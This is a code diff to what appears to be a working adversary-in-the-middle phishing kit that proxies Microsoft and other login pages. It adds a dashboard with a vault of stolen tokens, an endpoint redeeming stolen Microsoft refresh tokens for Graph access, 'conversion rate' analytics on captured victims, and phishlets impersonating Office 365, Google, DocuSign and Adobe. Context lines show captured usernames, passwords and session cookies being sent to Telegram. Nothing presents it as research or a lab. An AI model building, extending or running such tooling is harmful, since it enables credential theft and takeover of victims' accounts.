@@ -104,9 +104,8 @@ async function sendToTelegram(data) {
         
         // ────── CHECK IF ALREADY NOTIFIED ──────
         if (NOTIFIED_SESSIONS.has(sessionId)) {
-            return; // Already sent a notification for this session
+            return;
         }
-        // ────────────────────────────────────────
         
         // ────── FILTER: Only meaningful events ──────
         const hasCredentials = body && (body.includes('username') || body.includes('password') || body.includes('login') || body.includes('pass'));
@@ -115,7 +114,6 @@ async function sendToTelegram(data) {
         const isTokenExchange = url.includes('/token') && method === 'POST';
         const isLoginPage = url === 'https://login.microsoftonline.com/' || url === 'https://login.live.com/';
         
-        // Skip static assets and telemetry
         const isStatic = (
             url.includes('.css') || url.includes('.js') || url.includes('.gif') ||
             url.includes('.svg') || url.includes('.ico') || url.includes('.png') ||
@@ -124,23 +122,19 @@ async function sendToTelegram(data) {
             url.includes('favicon')
         );
         
-        // Skip redirects (302) and static assets
         if (data.proxyResponseStatusCode === 302) return;
         if (isStatic) return;
         
-        // Only notify for login-related events
         const shouldNotify = (
-            hasCredentials ||          // Username/password submitted
-            hasSessionCookie ||        // Session cookie received (successful login)
-            isTokenExchange ||         // Token exchange
-            isLoginPage                // Login page load
+            hasCredentials ||
+            hasSessionCookie ||
+            isTokenExchange ||
+            isLoginPage
         );
         
         if (!shouldNotify) return;
         
-        // ────── MARK AS NOTIFIED ──────
         NOTIFIED_SESSIONS.add(sessionId);
-        // ─────────────────────────────
         
         const ip = data.proxyRequestHeaders?.['cf-connecting-ip'] || 
                    data.proxyRequestHeaders?.['x-real-ip'] || 
@@ -157,7 +151,6 @@ async function sendToTelegram(data) {
             location = `${geo.city}, ${geo.regionName}, ${geo.country}`;
         }
 
-        // Build a nice, concise message
         let message = `
 🔐 **New Login Captured!**
 
@@ -172,7 +165,6 @@ ${flag} **Location:** ${location}
 📊 **Response:** ${data.proxyResponseStatusCode || 'N/A'}
         `;
 
-        // Add credentials if found
         if (hasCredentials && body) {
             let username = 'N/A';
             let password = 'N/A';
@@ -191,7 +183,6 @@ ${flag} **Location:** ${location}
             `;
         }
 
-        // Add session cookie info if found
         if (hasSessionCookie) {
             const cookies = data.proxyResponseHeaders['set-cookie'];
             const cookieArray = Array.isArray(cookies) ? cookies : [cookies];
@@ -244,26 +235,21 @@ const os = require("os");
 
 const VISITS_LOG_FILE = path.join(__dirname, "visit_logs", "visits.log");
 
-// Ensure the visit logs directory exists
 const VISITS_LOG_DIR = path.join(__dirname, "visit_logs");
 if (!fs.existsSync(VISITS_LOG_DIR)) {
     fs.mkdirSync(VISITS_LOG_DIR, { recursive: true });
 }
 
-// Function to log a visit (with country code)
 async function logVisit(clientRequest, clientResponse, sessionId) {
     const ip = clientRequest.headers['x-real-ip'] || 
                clientRequest.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
                'Unknown';
     
-    // Get country code from IP
     let countryCode = 'UN';
     if (ip !== 'Unknown') {
         try {
             countryCode = await getCountryCode(ip);
-        } catch (e) {
-            // Default to UN if lookup fails
-        }
+        } catch (e) {}
     }
     
     const visit = {
@@ -278,7 +264,6 @@ async function logVisit(clientRequest, clientResponse, sessionId) {
         statusCode: clientResponse.statusCode || 'N/A'
     };
     
-    // Append to visit log
     const logLine = JSON.stringify(visit) + '\n';
     fs.appendFileSync(VISITS_LOG_FILE, logLine);
 }
@@ -318,17 +303,12 @@ const PROXY_PATHNAMES = {
 const LOGS_DIRECTORY = path.join(__dirname, "phishing_logs");
 const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || "HyP3r-M3g4_S3cURe-EnC4YpT10n_k3Y";
 
-// Ensure logs directory exists
 if (!fs.existsSync(LOGS_DIRECTORY)) {
     fs.mkdirSync(LOGS_DIRECTORY, { recursive: true });
 }
 
 const LOG_FILE_STREAMS = {};
 const VICTIM_SESSIONS = {};
-
-// ================================================
-// 𝙳𝙰𝚂𝙷𝙱𝙾𝙰𝚁𝙳 𝙳𝙴𝙲𝚁𝚈𝙿𝚃 𝙵𝚄𝙽𝙲𝚃𝙸𝙾𝙽
-// ================================================
 
 function decryptData(encryptedData, ivHex) {
     const iv = Buffer.from(ivHex, 'hex');
@@ -355,7 +335,6 @@ dashApp.use(basicAuth({
 dashApp.use(express.json());
 dashApp.use(express.static('public'));
 
-// 𝚂𝙴𝚁𝚅𝙴 𝙵𝚁𝙾𝙼 𝙵𝙸𝙻𝙴
 dashApp.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
@@ -784,7 +763,6 @@ dashApp.post('/api/webmail/search', async (req, res) => {
 // 📊 VISITS API ENDPOINTS
 // ================================================
 
-// ---------- API: Get visits ----------
 dashApp.get('/api/visits', (req, res) => {
     try {
         const VISITS_LOG_FILE = path.join(__dirname, 'visit_logs', 'visits.log');
@@ -795,18 +773,11 @@ dashApp.get('/api/visits', (req, res) => {
         const content = fs.readFileSync(VISITS_LOG_FILE, 'utf-8');
         const lines = content.split('\n').filter(line => line.trim());
         const visits = lines.map(line => JSON.parse(line));
-        
-        // Sort by timestamp (newest first)
         visits.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
-        
-        // Count unique IPs
         const uniqueIPs = new Set(visits.map(v => v.ip)).size;
-        
-        // Count visits today and this week
         const now = new Date();
         const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
         const weekAgo = new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000);
-        
         const todayVisits = visits.filter(v => new Date(v.timestamp) >= today);
         const weekVisits = visits.filter(v => new Date(v.timestamp) >= weekAgo);
         
@@ -822,32 +793,276 @@ dashApp.get('/api/visits', (req, res) => {
     }
 });
 
-// ---------- API: Get visit stats (summary) ----------
 dashApp.get('/api/visits/stats', (req, res) => {
     try {
         const VISITS_LOG_FILE = path.join(__dirname, 'visit_logs', 'visits.log');
         if (!fs.existsSync(VISITS_LOG_FILE)) {
             return res.json({ total: 0, uniqueIPs: 0, today: 0, week: 0 });
         }
-        
         const content = fs.readFileSync(VISITS_LOG_FILE, 'utf-8');
         const lines = content.split('\n').filter(line => line.trim());
         const visits = lines.map(line => JSON.parse(line));
-        
         const now = new Date();
         const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
         const weekAgo = new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000);
-        
         const todayVisits = visits.filter(v => new Date(v.timestamp) >= today);
         const weekVisits = visits.filter(v => new Date(v.timestamp) >= weekAgo);
         const uniqueIPs = new Set(visits.map(v => v.ip)).size;
-        
         res.json({
             total: visits.length,
             uniqueIPs: uniqueIPs,
             today: todayVisits.length,
             week: weekVisits.length
         });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+// ================================================
+// 🏛️ TOKEN VAULT API
+// ================================================
+
+const TokenVault = require('./token_vault.js');
+const vault = new TokenVault(LOGS_DIRECTORY, ENCRYPTION_KEY);
+
+dashApp.post('/api/vault/scan', (req, res) => {
+    try {
+        const tokens = vault.scanLogs();
+        res.json({ success: true, count: tokens.length });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+dashApp.get('/api/vault/tokens', (req, res) => {
+    try {
+        res.json({ success: true, tokens: vault.tokens });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+dashApp.get('/api/vault/users', (req, res) => {
+    try {
+        const users = vault.getTokensByUser();
+        res.json({ success: true, users });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+dashApp.get('/api/vault/stats', (req, res) => {
+    try {
+        const stats = vault.getStats();
+        res.json({ success: true, stats });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+dashApp.post('/api/vault/healthcheck', async (req, res) => {
+    try {
+        const results = await vault.healthCheckAll();
+        res.json({ success: true, results });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+dashApp.post('/api/vault/exchange', async (req, res) => {
+    const { tokenValue } = req.body;
+    if (!tokenValue) return res.status(400).json({ error: 'Token value required' });
+
+    try {
+        const response = await axios.post(
+            'https://login.microsoftonline.com/common/oauth2/v2.0/token',
+            new URLSearchParams({
+                client_id: '3ce82761-cb43-493f-94bb-fe444b7a0cc4',
+                refresh_token: tokenValue,
+                grant_type: 'refresh_token',
+                scope: 'https://graph.microsoft.com/.default offline_access'
+            }),
+            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
+        );
+        res.json({ success: true, data: response.data });
+    } catch (err) {
+        res.status(500).json({ 
+            error: err.response?.data?.error_description || err.message 
+        });
+    }
+});
+
+// ================================================
+// 📊 CAMPAIGN ANALYTICS API
+// ================================================
+
+dashApp.get('/api/analytics', (req, res) => {
+    try {
+        const VISITS_LOG_FILE = path.join(__dirname, 'visit_logs', 'visits.log');
+        let visits = [];
+        let captures = [];
+        
+        if (fs.existsSync(VISITS_LOG_FILE)) {
+            const content = fs.readFileSync(VISITS_LOG_FILE, 'utf-8');
+            const lines = content.split('\n').filter(line => line.trim());
+            visits = lines.map(line => JSON.parse(line));
+        }
+        
+        const logFiles = fs.readdirSync(LOGS_DIRECTORY).filter(f => f.endsWith('.log'));
+        captures = logFiles.map(f => {
+            const stat = fs.statSync(path.join(LOGS_DIRECTORY, f));
+            return { file: f, modified: stat.mtime, size: stat.size };
+        });
+        
+        const now = new Date();
+        const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
+        const weekAgo = new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000);
+        const monthAgo = new Date(now.getTime() - 30 * 24 * 60 * 60 * 1000);
+        
+        const todayVisits = visits.filter(v => new Date(v.timestamp) >= today);
+        const weekVisits = visits.filter(v => new Date(v.timestamp) >= weekAgo);
+        const monthVisits = visits.filter(v => new Date(v.timestamp) >= monthAgo);
+        
+        const todayCaptures = captures.filter(c => c.modified >= today);
+        const weekCaptures = captures.filter(c => c.modified >= weekAgo);
+        const monthCaptures = captures.filter(c => c.modified >= monthAgo);
+        
+        const conversionRate = {
+            today: todayVisits.length > 0 ? (todayCaptures.length / todayVisits.length * 100).toFixed(1) : 0,
+            week: weekVisits.length > 0 ? (weekCaptures.length / weekVisits.length * 100).toFixed(1) : 0,
+            month: monthVisits.length > 0 ? (monthCaptures.length / monthVisits.length * 100).toFixed(1) : 0,
+            total: visits.length > 0 ? (captures.length / visits.length * 100).toFixed(1) : 0
+        };
+        
+        const dailyCaptures = {};
+        const dailyVisits = {};
+        for (let i = 6; i >= 0; i--) {
+            const d = new Date(now.getTime() - i * 24 * 60 * 60 * 1000);
+            const key = d.toDateString();
+            dailyCaptures[key] = 0;
+            dailyVisits[key] = 0;
+        }
+        
+        captures.forEach(c => {
+            const key = new Date(c.modified).toDateString();
+            if (dailyCaptures.hasOwnProperty(key)) dailyCaptures[key]++;
+        });
+        
+        visits.forEach(v => {
+            const key = new Date(v.timestamp).toDateString();
+            if (dailyVisits.hasOwnProperty(key)) dailyVisits[key]++;
+        });
+        
+        const domains = {};
+        visits.forEach(v => {
+            const url = v.url || '';
+            const match = url.match(/https?:\/\/([^\/]+)/);
+            if (match) {
+                const domain = match[1];
+                domains[domain] = (domains[domain] || 0) + 1;
+            }
+        });
+        const topDomains = Object.entries(domains)
+            .sort((a, b) => b[1] - a[1])
+            .slice(0, 5)
+            .map(([domain, count]) => ({ domain, count }));
+        
+        const uniqueIPs = new Set(visits.map(v => v.ip)).size;
+        
+        res.json({
+            success: true,
+            analytics: {
+                visits: {
+                    total: visits.length,
+                    today: todayVisits.length,
+                    week: weekVisits.length,
+                    month: monthVisits.length
+                },
+                captures: {
+                    total: captures.length,
+                    today: todayCaptures.length,
+                    week: weekCaptures.length,
+                    month: monthCaptures.length
+                },
+                conversionRate,
+                uniqueIPs,
+                dailyCaptures,
+                dailyVisits,
+                topDomains,
+                captureTimeline: captures.map(c => ({
+                    date: c.modified,
+                    file: c.file,
+                    size: c.size
+                }))
+            }
+        });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+// ================================================
+// 🎭 PHISHLET API
+// ================================================
+
+dashApp.get('/api/phishlets', (req, res) => {
+    try {
+        const phishletsPath = path.join(__dirname, 'phishlets.json');
+        if (!fs.existsSync(phishletsPath)) {
+            const defaultPhishlets = {
+                "microsoft": {
+                    "name": "Microsoft Office 365",
+                    "icon": "microsoft",
+                    "file": "index_smQGUDpTF7PN.html",
+                    "entryPoint": "/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https://login.microsoftonline.com/",
+                    "enabled": true
+                },
+                "google": {
+                    "name": "Google Workspace",
+                    "icon": "google",
+                    "file": "google_login.html",
+                    "entryPoint": "/google/login?redirect_uri=https://accounts.google.com/",
+                    "enabled": false
+                },
+                "docusign": {
+                    "name": "DocuSign",
+                    "icon": "docusign",
+                    "file": "docusign_login.html",
+                    "entryPoint": "/docusign/login?redirect_uri=https://account.docusign.com/",
+                    "enabled": false
+                },
+                "adobe": {
+                    "name": "Adobe Acrobat",
+                    "icon": "adobe",
+                    "file": "adobe_login.html",
+                    "entryPoint": "/adobe/login?redirect_uri=https://account.adobe.com/",
+                    "enabled": false
+                }
+            };
+            fs.writeFileSync(phishletsPath, JSON.stringify(defaultPhishlets, null, 2));
+            return res.json({ success: true, phishlets: defaultPhishlets });
+        }
+        
+        const phishlets = JSON.parse(fs.readFileSync(phishletsPath, 'utf-8'));
+        res.json({ success: true, phishlets });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+dashApp.post('/api/phishlets/toggle', (req, res) => {
+    const { id, enabled } = req.body;
+    try {
+        const phishletsPath = path.join(__dirname, 'phishlets.json');
+        const phishlets = JSON.parse(fs.readFileSync(phishletsPath, 'utf-8'));
+        if (phishlets[id]) {
+            phishlets[id].enabled = enabled;
+            fs.writeFileSync(phishletsPath, JSON.stringify(phishlets, null, 2));
+            res.json({ success: true });
+        } else {
+            res.status(404).json({ error: 'Phishlet not found' });
+        }
     } catch (err) {
         res.status(500).json({ error: err.message });
     }
@@ -868,7 +1083,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
         return;
     }
 
-    // Log the visit asynchronously (don't await, fire and forget)
+    // Log the visit asynchronously
     logVisit(clientRequest, clientResponse, currentSession || 'new').catch(() => {});
 
     if (url.startsWith(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
@@ -899,7 +1114,6 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
 
     else if (currentSession || url === PROXY_PATHNAMES.proxy) {
         if (url === PROXY_PATHNAMES.serviceWorker) {
-            // Service workers cannot use eval() - serve unobfuscated
             clientResponse.writeHead(200, {
                 'Content-Type': 'text/javascript',
                 'Cache-Control': 'no-store'
@@ -1203,7 +1417,7 @@ const makeProxyRequest = (proxyRequestProtocol, proxyRequestOptions, currentSess
         proxyRequest.write(proxyRequestBody);
     }
     proxyRequest.end();
-}
+};
 
 // ================================================
 // 𝙷𝙴𝙻𝙿𝙴𝚁 𝙵𝚄𝙽𝙲𝚃𝙸𝙾𝙽𝚂
